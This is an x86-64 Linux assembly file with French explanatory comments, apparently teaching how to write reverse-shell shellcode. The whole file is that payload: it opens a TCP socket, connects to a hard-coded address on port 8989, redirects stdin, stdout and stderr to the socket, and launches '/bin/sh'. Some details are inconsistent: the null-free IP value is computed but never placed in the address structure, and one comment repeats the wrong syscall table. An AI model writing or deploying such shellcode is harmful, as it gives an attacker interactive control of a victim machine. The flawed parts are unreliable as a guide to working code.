BITS 64
section .text

; il n'est normalement pas utile de nettoyer les registres au début d'un 
; code, c'est pour les bons réflexes
xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx

; SOCKET
; 41	sys_socket	int family	int type	int protocol
;                       (on veut ip_v4) (on veut TCP)
; %rax	System call	%rdi	        %rsi	        %rdx

mov al, 0x29                ; 0x29 = 41 base 10, sys_socket
mov bl, 0x02                ; 2 à destination finale de RDI, pour AF_INTET (ipv4)
mov rdi, rbx
mov bl, 0x01               ; 1 à destination finale de RSI, pour SOCK_STREAM (TCP)
mov rsi, rbx
syscall

; le syscall SOCKET retourne un file descriptor sans RAX. 
; c'est un peu l'objet de notre socket, où il se trouve. 
; ce File Descriptor est très important, c'est l'adresse de notre socket ! 

; CONNECT

;42	sys_connect	int fd	struct sockaddr *uservaddr	int addrlen

; recup FD
mov rdi, rax
mov r10, rax

xor rax, rax
mov al, 0x2A                ; syscall connect


xor rbx, rbx
push rbx

; ABOUT IP : 192.168.1.113
;(first octet * 256³) + (second octet * 256²) + (third octet * 256) + (fourth octet)
;first octet * 16777216) + (second octet * 65536) + (third octet * 256) + (fourth octet)
;(192 * 16777216) + (168 * 65536) + (1 * 256) + (113)
;3232235889 en décimal
; soit 0xc0a80171 en hex
; checker la fonction htons pour automatisation si ça vous interesse (hors asm)

; problématique pour les IP qui en hexa contiennent un "00" :
; hé oui, on ne veut pas de nullbyte !
; dword 0x0100007f correspond à 127.0.0.1 

; on effectue donc une soustraction de deux nombres dans 00 dont le résultat correspond à 0x0100007f !
mov esi, 0x0100007f
sub esi, 0x010ffff01
push word 7459              ; hexadécimal pour le port 8989
push word 2                 ; AF_INET
mov rsi, rsp
mov dl, 24
syscall

xor rax, rax
xor rdx, rdx
mov al, 33                  ; syscall dup2
mov rdi, r10                ; socket.fd
xor rsi, rsi                ; stdin
syscall                     ; 

xor rax, rax
xor rdx, rdx
mov al, 33                  ; syscall dup2
mov rdi, r10                ; socket.fd
inc rsi                     ; stout
syscall                      

xor rax, rax
xor rdx, rdx
mov al, 33                  ; syscall dup2
mov rdi, r10                ; socket.fd
inc rsi                     ; stderr
syscall                      

; int execve(const char *filename, char *const argv [], char *const envp[]);
; 41	sys_socket	int family	int type	int protocol
; %rax	System call	%rdi	        %rsi	        %rdx

xor rax, rax
xor rdx, rdx
mov rbx, 0x68732f6e69622f2f
push rax                    ; IMPORTANT 
push rbx                    ; on met rbx sur la stack
mov rdi, rsp                ; on stock l'adresse de rbx (qui viens d'etre push) dans rdi (arg1)
push rax
push rdi
mov rsi, rsp                ; stock de la stack dans rsi (arg2)
mov al, 0x3b                ; num syscall de execve
syscall

xor rdi, rdi
xor rax, rax
mov al,  0x3c               ; syscall de exit
syscall





